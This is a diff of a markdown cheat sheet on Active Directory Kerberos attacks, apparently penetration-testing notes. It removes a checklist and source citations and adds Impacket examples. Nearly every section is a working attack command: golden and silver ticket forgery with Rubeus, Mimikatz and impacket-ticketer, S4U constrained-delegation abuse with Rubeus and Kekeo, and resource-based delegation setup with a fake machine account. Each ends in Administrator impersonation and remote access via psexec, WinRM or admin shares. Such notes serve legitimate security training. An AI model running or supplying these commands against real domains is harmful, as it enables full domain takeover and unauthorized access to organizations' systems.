@@ -5,35 +5,7 @@
 
 ---
 
-## Table of Contents
-
-- [Kerberos & Delegation Abuse Checklist](#kerberos--delegation-abuse-checklist)
-- [Golden Ticket vs. Silver Ticket Comparison](#golden-ticket-vs-silver-ticket-comparison)
-- [Golden Ticket Creation (Rubeus & Mimikatz)](#golden-ticket-creation-rubeus--mimikatz)
-- [Silver Ticket Forgery](#silver-ticket-forgery)
-- [Kerberos Delegation Overview](#kerberos-delegation-overview)
-- [S4U Constrained Delegation Flow Diagram](#s4u-constrained-delegation-flow-diagram)
-- [Constrained Delegation Exploitation (Rubeus & Kekeo)](#constrained-delegation-exploitation-rubeus--kekeo)
-- [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
-
----
-
-## Kerberos & Delegation Abuse Checklist
-
-- [ ] **1. Golden Ticket Requirements Check:** Obtain `krbtgt` account AES256 key/hash via DCSync and Domain SID (`Get-Domain`).
-- [ ] **2. Golden Ticket Forgery:** Generate and import TGT using Rubeus or Mimikatz (`Rubeus.exe golden /aes256:<KRBTGT_AES256>`).
-- [ ] **3. Silver Ticket Forgery:** Extract target service account hash and forge TGS (`Rubeus.exe silver /service:http/<TARGET_FQDN>`).
-- [ ] **4. WMI Silver Ticket Check:** Verify both `HOST` and `RPCSS` service tickets are generated for WMI execution.
-- [ ] **5. Constrained Delegation Enumeration:** Query accounts with `TrustedToAuthForDelegation` (`Get-NetUser -TrustedToAuth`, `Get-DomainComputer -TrustedToAuth`).
-- [ ] **6. S4U Execution:** Perform S4U2self + S4U2proxy attack using Rubeus (`Rubeus.exe s4u /user:<DELEGATED_ACCOUNT> /impersonateuser:Administrator`).
-- [ ] **7. Resource-Based Constrained Delegation (RBCD):**
-  - [ ] Create fake computer account (`New-MachineAccount`).
-  - [ ] Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target computer object.
-  - [ ] Execute Rubeus S4U impersonating Domain Administrator.
-
----
-
-## Golden Ticket vs. Silver Ticket Comparison
+## Golden Ticket vs. Silver Ticket
 
 | Property | Golden Ticket (TGT) | Silver Ticket (TGS) |
 | :--- | :--- | :--- |
@@ -45,56 +17,59 @@
 
 ---
 
-## Golden Ticket Creation (Rubeus & Mimikatz)
+## Golden Ticket Creation
 
 Golden Tickets forge a TGT signed with the `krbtgt` password key.
 
+### Rubeus
 ```cmd
-# Rubeus Golden Ticket generation & injection
 Rubeus.exe golden /aes256:<KRBTGT_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
-
-# Mimikatz Golden Ticket generation & injection
-mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /ptt
 ```
 
-> **Source:** handwritten pp. 31, 48.
+### Mimikatz
+```text
+kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /ptt
+```
+
+### Impacket — ticketer
+```bash
+impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec <DOMAIN>/Administrator@<DC> -k -no-pass
+```
 
 ---
 
 ## Silver Ticket Forgery
 
-Silver Tickets forge a TGS for a specific Service Principal Name (SPN) using the service account's NTLM hash or AES256 key.
+Forges a TGS for a specific Service Principal Name (SPN) using the service account's key.
 
+### Rubeus
 ```cmd
-# Rubeus Silver Ticket for HTTP service on target host
 Rubeus.exe silver /service:http/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
 ```
 
 > [!WARNING]
-> **WMI Silver Ticket Requirement:** To execute commands remotely via WMI using a Silver Ticket, service tickets for **BOTH** `HOST` and `RPCSS` must be generated and imported.
+> **WMI Silver Ticket:** To execute commands via WMI, tickets for **BOTH** `HOST` and `RPCSS` must be generated.
 
 ```cmd
 Rubeus.exe silver /service:host/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
 Rubeus.exe silver /service:rpcss/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
 ```
 
-> **Source:** handwritten pp. 32, 48.
-
 ---
 
 ## Kerberos Delegation Overview
 
-- **Unconstrained Delegation (UD):** When a user authenticates to a service with UD enabled, the DC places a copy of the user's TGT inside the service ticket. The service extracts the TGT from LSASS and can impersonate the user anywhere.
+- **Unconstrained Delegation (UD):** The DC places a copy of the user's TGT inside the service ticket. The service extracts the TGT from LSASS and can impersonate the user anywhere.
 - **Constrained Delegation (CD):** Restricts delegation to specific target SPNs (`msDS-AllowedToDelegateTo`). Allows protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`).
-- **Resource-Based Constrained Delegation (RBCD):** Specifies delegation permissions on the target resource object itself (`msDS-AllowedToActOnBehalfOfOtherIdentity`).
-
-> **Source:** handwritten p. 38.
+- **Resource-Based Constrained Delegation (RBCD):** Delegation permissions set on the target resource object itself (`msDS-AllowedToActOnBehalfOfOtherIdentity`).
 
 ---
 
-## S4U Constrained Delegation Flow Diagram
+## S4U Constrained Delegation Flow
 
-Constrained delegation uses two Kerberos extensions: **S4U2self** (requests a service ticket to self on behalf of any user) and **S4U2proxy** (uses that ticket to request a service ticket to the allowed downstream service).
+Constrained delegation uses **S4U2self** (requests a service ticket to self on behalf of any user) and **S4U2proxy** (uses that ticket to request a service ticket to the allowed downstream service).
 
 ```mermaid
 sequenceDiagram
@@ -117,46 +92,42 @@ sequenceDiagram
 
 ---
 
-## Constrained Delegation Exploitation (Rubeus & Kekeo)
+## Constrained Delegation Exploitation
 
-### 1. Enumerate Constrained Delegation Accounts
+### Enumerate
 ```powershell
-# PowerView: Find accounts with TrustedToAuthForDelegation flag set
 Get-NetUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 ```
 
-### 2. Execute S4U Attack via Rubeus
+### Rubeus S4U
 ```cmd
-# Obtain TGT and execute S4U2self + S4U2proxy in one command
 Rubeus.exe s4u /user:<DELEGATED_USER> /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
 ```
 
-### 3. Legacy Kekeo & Mimikatz Workflow
+### Kekeo + Mimikatz (Legacy)
 ```text
 # Step 1: Ask TGT for delegated service account
 kekeo # tgt::ask /user:<DELEGATED_USER> /domain:<DOMAIN> /password:<PASSWORD>
 
-# Step 2: Request S4U TGS impersonating Domain Admin
+# Step 2: S4U TGS impersonating Domain Admin
 kekeo # tgs::s4u /tgt:<TGT_FILE> /user:Administrator /service:cifs/<TARGET_FQDN>
 
-# Step 3: Pass-the-Ticket with Mimikatz
+# Step 3: Pass-the-Ticket
 mimikatz # kerberos::ptt <TGS_TICKET_FILE>
 ```
 
+### Post-Exploitation
 ```powershell
-# Connect to target host via WinRM or Remote SMB
 Enter-PSSession -ComputerName <TARGET_FQDN>
 ls \\<TARGET_FQDN>\c$
 ```
-
-> **Source:** handwritten pp. 39–41.
 
 ---
 
 ## Resource-Based Constrained Delegation (RBCD)
 
-If an attacker holds `GenericWrite` or `GenericAll` over a computer object, they can configure RBCD on that computer object:
+If an attacker holds `GenericWrite` or `GenericAll` over a computer object, they can configure RBCD.
 
 ```powershell
 # Step 1: Create a fake computer account (if machine account quota permits)
@@ -169,4 +140,13 @@ Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{'msds-allowedtoactonbehalfof
 Rubeus.exe s4u /user:FakeMachine$ /password:'P@ss123!' /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER> /ptt
 ```
 
-> **Source:** handwritten pp. 41, 48.
+### Impacket RBCD
+```bash
+# Configure RBCD
+impacket-rbcd <DOMAIN>/<USER>:<PASSWORD> -delegate-to <TARGET_COMPUTER>$ -delegate-from FakeMachine$ -dc-ip <DC_IP> -action write
+
+# S4U to get ticket
+impacket-getST <DOMAIN>/FakeMachine$:'P@ss123!' -spn cifs/<TARGET_COMPUTER> -impersonate Administrator -dc-ip <DC_IP>
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec <DOMAIN>/Administrator@<TARGET_COMPUTER> -k -no-pass
+```
